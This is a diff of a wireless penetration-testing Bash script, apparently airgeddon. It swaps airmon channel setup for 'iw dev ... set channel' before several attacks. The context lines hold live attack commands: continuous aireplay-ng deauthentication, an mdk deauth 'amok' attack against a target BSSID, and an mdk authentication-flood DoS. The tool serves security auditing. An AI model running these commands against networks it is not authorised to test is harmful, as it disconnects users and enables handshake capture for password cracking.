@@ -4463,7 +4463,7 @@ function set_wep_script() {
 			fi
 		}
 
-		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
 		#shellcheck disable=SC2164
 		pushd "${tmpdir}${wepdir}" > /dev/null 2>&1
@@ -4911,7 +4911,6 @@ function launch_dos_pursuit_mode_attack() {
 			fi
 		;;
 		"aireplay deauth attack")
-			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
@@ -13645,6 +13644,7 @@ function capture_handshake_evil_twin() {
 		"${mdk_command}")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13655,7 +13655,7 @@ function capture_handshake_evil_twin() {
 			sleeptimeattack=12
 		;;
 		"Aireplay")
-			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -13666,6 +13666,7 @@ function capture_handshake_evil_twin() {
 			sleeptimeattack=12
 		;;
 		"Auth DoS")
+			iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 			recalculate_windows_sizes
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14364,7 +14365,7 @@ function dos_info_gathering_enterprise_menu() {
 				fi
 				identities_certificates_capture_window "${1}"
 
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14391,7 +14392,7 @@ function dos_info_gathering_enterprise_menu() {
 				fi
 				identities_certificates_capture_window "${1}"
 
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14460,6 +14461,7 @@ function dos_handshake_decloaking_menu() {
 				fi
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14485,7 +14487,7 @@ function dos_handshake_decloaking_menu() {
 				else
 					capture_handshake_window
 				fi
-				${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -14511,6 +14513,7 @@ function dos_handshake_decloaking_menu() {
 				else
 					capture_handshake_window
 				fi
+				iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 				recalculate_windows_sizes
 				manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_bottomleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m" "auth dos attack"
 				if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
